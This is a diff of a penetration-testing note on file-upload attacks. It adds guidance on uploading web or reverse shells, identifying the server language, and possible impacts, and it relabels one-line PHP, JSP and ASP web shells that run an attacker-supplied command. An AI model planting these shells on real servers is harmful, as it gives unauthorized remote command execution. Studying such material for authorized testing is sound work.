@@ -12,10 +12,13 @@
 
 </details>
 
-### RCE via Web Shell
+### RCE via Web Shell <sup><sub>(Absent Validation)<sub></sup>
 
-* Upload payload file
+* We may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.
 * No restriction specified in accept-type header - all types (_/_) allowed
+* Identifying Web Framework and choose the appropriate command or web shell.
+  * &#x20;To determine what language runs the web application is to visit the `/index.ext`  and FUZZ the extension using various [SecLists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
+  * [Wappalyzer](https://www.wappalyzer.com/) extension
 * [#web-shells](../../network/exploitation/shells-and-listeners.md#web-shells "mention")
 
 <details>
@@ -24,9 +27,12 @@
 
 {% code lineNumbers="true" %}
 ```shellscript
+## PHP
 <?php system($_REQUEST["cmd"]); ?>
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %> //jsp
-<% eval request("cmd") %> //asp
+## JSP
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+## ASP
+<% eval request("cmd") %>
 ```
 {% endcode %}
 
@@ -218,6 +224,12 @@ Content-Length: 49
 ### PDF Injection
 
 {% file src="../../.gitbook/assets/xss2pdf.py" %}
+
+### Examples of attacks include:
+
+* Introducing other vulnerabilities like `XSS` or `XXE`.
+* Causing a `Denial of Service (DoS)` on the back-end server.
+* Overwriting critical system files and configurations.
 
 ### Links
 
